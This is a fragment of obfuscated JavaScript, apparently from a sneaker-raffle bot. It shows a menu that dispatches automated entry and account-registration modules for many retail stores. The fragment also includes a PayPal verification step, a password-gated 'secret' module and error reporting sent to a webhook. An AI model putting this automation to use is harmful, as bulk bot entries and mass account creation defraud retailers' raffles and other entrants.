                if (_0x502cc7[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                        var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x32a34e = await _0x278dd0(), _0x28ffc7 = await _0x3ac6d3(_0x25df63);
                            _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x28ffc7), await _0x25df63['function'](_0x25df63, _0x28ffc7, _0x32a34e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x32a34e = await _0x278dd0(), _0x28ffc7 = await _0x3ac6d3(_0x25df63);
                                _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x28ffc7), await _0x25df63['function'](_0x25df63, _0x28ffc7, _0x32a34e);
                            }
                        }
                    } catch (_0x2b0f3d) {
                        console['log'](_0x2b0f3d), await _0x32344d(0xfa0);
                    }
                    return _0x21c2a3();
                }
                if (_0x502cc7[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                        var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x32a34e = await _0x278dd0(), _0x28ffc7 = await _0x3ac6d3(_0x25df63);
                            _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x28ffc7), await _0x25df63['function'](_0x25df63, _0x28ffc7, _0x32a34e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x32a34e = await _0x278dd0(), _0x28ffc7 = await _0x3ac6d3(_0x25df63);
                                _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x28ffc7), await _0x25df63['function'](_0x25df63, _0x28ffc7, _0x32a34e);
                            }
                        }
                    } catch (_0x2fc304) {
                        console['log'](_0x2fc304), await _0x32344d(0xfa0);
                    }
                    return _0x21c2a3();
                }
                if (_0x502cc7[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x32a34e = await _0x278dd0();
                        return await _0x25df63['function'](_0x25df63, _0x32a34e), _0x21c2a3();
                    }
                    var _0x32a34e = await _0x278dd0(), _0x3b69ff = await _0x3ac6d3(_0x25df63);
                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x3b69ff), await _0x25df63['function'](_0x25df63, _0x3b69ff, _0x32a34e), _0x21c2a3();
                }
                if (_0x502cc7[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x32a34e = await _0x278dd0(), _0x3b69ff = await _0x3ac6d3(_0x25df63);
                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x3b69ff), await _0x25df63['function'](_0x25df63, _0x3b69ff, _0x32a34e), _0x21c2a3();
                }
                if (_0x502cc7[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x32a34e = await _0x278dd0(), _0x3b69ff = await _0x3ac6d3(_0x25df63);
                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x3b69ff), await _0x25df63['function'](_0x25df63, _0x3b69ff, _0x32a34e), _0x21c2a3();
                }
                if (_0x502cc7[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x32a34e = await _0x278dd0(), _0x3b69ff = await _0x3ac6d3(_0x25df63);
                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x3b69ff), await _0x25df63['function'](_0x25df63, _0x3b69ff, _0x32a34e), _0x21c2a3();
                } else {
                    if (_0x502cc7[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                        var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x32a34e = await _0x278dd0(), _0x4e50ea = await _0x3ac6d3(_0x25df63);
                            return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x4e50ea), await _0x25df63['function'](_0x25df63, _0x4e50ea, _0x32a34e), _0x21c2a3();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x32a34e = await _0x278dd0();
                                return await _0x25df63['function'](_0x25df63, null, _0x32a34e), _0x21c2a3();
                            }
                        }
                        ;
                    } else {
                        if (_0x502cc7[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                            var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction], _0x32a34e = await _0x278dd0(), _0x1d0858 = await _0x3ac6d3(_0x25df63);
                            return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x1d0858), await _0x25df63['function'](_0x25df63, _0x1d0858, _0x32a34e), await _0x32344d(0x1388), _0x21c2a3();
                        } else {
                            if (_0x502cc7[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x32a34e = await _0x278dd0(), _0x4e50ea = await _0x3ac6d3(_0x25df63);
                                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x4e50ea), await _0x25df63['function'](_0x25df63, _0x4e50ea, _0x32a34e), _0x21c2a3();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x32a34e = await _0x278dd0();
                                        return await _0x25df63['function'](_0x25df63, null, _0x32a34e), _0x21c2a3();
                                    }
                                }
                                ;
                            } else {
                                if (_0x502cc7[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x25df63);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x502cc7[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                        var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x32a34e = await _0x278dd0(), _0x801ac1 = await _0x3ac6d3(_0x25df63);
                                            return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x801ac1), await _0x25df63['function'](_0x25df63, _0x801ac1, _0x32a34e), _0x21c2a3();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x32a34e = await _0x278dd0(), _0x801ac1 = await _0x3ac6d3(_0x25df63);
                                                return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x801ac1), await _0x25df63['function'](_0x25df63, _0x801ac1, _0x32a34e), _0x21c2a3();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x502cc7[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                            var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x32a34e = await _0x278dd0(), _0x3db681 = await _0x3ac6d3(_0x25df63);
                                                return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x3db681), await _0x25df63['function'](_0x25df63, _0x3db681, _0x32a34e), _0x21c2a3();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x32a34e = await _0x278dd0(), _0x3db681 = await _0x3ac6d3(_0x25df63);
                                                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x3db681), await _0x25df63['function'](_0x25df63, _0x3db681, _0x32a34e), _0x21c2a3();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x502cc7[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                                var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x32a34e = await _0x278dd0(), _0x170b59 = await _0x3ac6d3(_0x25df63);
                                                    return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x170b59), await _0x25df63['function'](_0x25df63, _0x170b59, _0x32a34e), _0x21c2a3();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x32a34e = await _0x278dd0(), _0x170b59 = await _0x3ac6d3(_0x25df63);
                                                        return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x170b59), await _0x25df63['function'](_0x25df63, _0x170b59, _0x32a34e), _0x21c2a3();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x502cc7[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x32a34e = await _0x278dd0(), _0x177521 = await _0x3ac6d3(_0x25df63);
                                                        return _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x177521), await _0x25df63['function'](_0x25df63, _0x177521, _0x32a34e), _0x21c2a3();
                                                    }
                                                } else {
                                                    if (_0x502cc7[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x32344d(0x3e8), _0x21c2a3();
                                                    else {
                                                        if (_0x502cc7[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x41ac22 = _0x502cc7[taskModule]['name'], _0x32a34e = await _0x278dd0();
                                                            return await _0x36c025(_0x41ac22, _0x32a34e), _0x21c2a3();
                                                        } else {
                                                            if (_0x502cc7[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                                                                var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                                                                return await _0x25df63['function'](_0x25df63), _0x21c2a3();
                                                            } else {
                                                                if (_0x502cc7[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x492876 = 0x0;
                                                                    for (const _0x43bd1f in _0x8aa917) {
                                                                        console['log']('(' + _0x492876 + ')\x20' + _0x43bd1f + '\x20:\x20' + _0x8aa917[_0x43bd1f]), _0x492876++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x492876 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x151c13 = await _0x49e90f();
                                                                    if (_0x151c13 == _0x492876)
                                                                        return _0x21c2a3();
                                                                    console['clear'];
                                                                    var _0x7b614f = 0x0;
                                                                    for (var _0x1d9887 in _0x8aa917) {
                                                                        if (_0x151c13 == _0x7b614f) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1d9887 + '\x20:'), _0x8aa917[_0x1d9887] = await _0x2190d8(), _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917));
                                                                            break;
                                                                        } else
                                                                            _0x7b614f++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x32344d(0xbb8), _0x21c2a3();
                                                                } else {
                                                                    if (_0x502cc7[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0xbe10e3(), _0x21c2a3();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x502cc7[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x55ef3b = await _0x29b653();
                                                                            _0x55ef3b == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x2ef326(), await afewFunction(_0x59afab[_0x41d0d0], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x32344d(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x21c2a3();
            } catch (_0x4793bd) {
                return console['log'](_0x4793bd), _0x21c2a3();
            }
        } catch (_0x3ba298) {
            return console['log'](_0x3ba298), await _0x32344d(0x3a98);
        }
}
;
_0x299f70('JRaffles\x20' + _0xe2f4c8), _0xbe10e3();
try {
    _0x56f378();
} catch (_0x504c07) {
    var _0x311c90 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x4b3861
            },
            {
                'name': 'Version',
                'value': '' + _0xe2f4c8
            },
            {
                'name': 'Error',
                'value': '' + _0x504c07
            }
        ]
    }];
    const _0x323311 = { 'embeds': _0x311c90 };
    _0x16e110(_0x3ba800, _0x323311);
}